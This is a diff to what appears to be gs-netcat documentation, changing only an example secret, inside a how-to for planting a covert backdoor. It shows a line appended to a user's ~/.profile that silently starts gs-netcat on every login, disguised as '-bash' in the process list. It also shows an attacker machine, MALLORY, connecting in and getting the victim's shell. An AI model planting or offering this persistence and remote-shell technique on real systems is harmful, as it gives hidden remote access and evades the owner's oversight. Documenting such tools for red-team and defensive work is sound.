@@ -13,7 +13,7 @@ Start gs-netcat from ALICE's *~/.profile* and do so secretly and silently (witho
 
 On "ALICE" add the following line to the end of *~/.profile*. This will start the gs-netcat backdoor every time that ALICE logs in. The gs-netcat process is hidden as *-bash* and shows up as *-bash* in the process list.
 ```
-killall -0 gs-netcat 2>/dev/null || (GSOCKET_ARGS="-s ExampleKeyXXXXChangeMe -liqD" SHELL=/bin/bash exec -a -bash gs-netcat)
+killall -0 gs-netcat 2>/dev/null || (GSOCKET_ARGS="-s ExampleSecretChangeMe -liqD" SHELL=/bin/bash exec -a -bash gs-netcat)
 ```
 
 Start the backdoor manually for testing. Thereafter the backdoor will start (and remain running) whenever ALICE logs in for the first time:
@@ -23,8 +23,8 @@ alice@ALICE:~$ source ~/.profile
 
 Now log in from "MALLORY" to "ALICE":
 ```ShellSession
-m@MALLORY:~ $ gs-netcat -s ExampleKeyXXXXChangeMe -i
-=Secret         : "ExampleKeyXXXXChangeMe"
+m@MALLORY:~ $ gs-netcat -s ExampleSecretChangeMe -i
+=Secret         : "ExampleSecretChangeMe"
 =Encryption     : SRP-AES-256-CBC-SHA-End2End (Prime: 4096 bits)
 alice@ALICE:~$ id
 uid=1001(alice) gid=1001(alice)
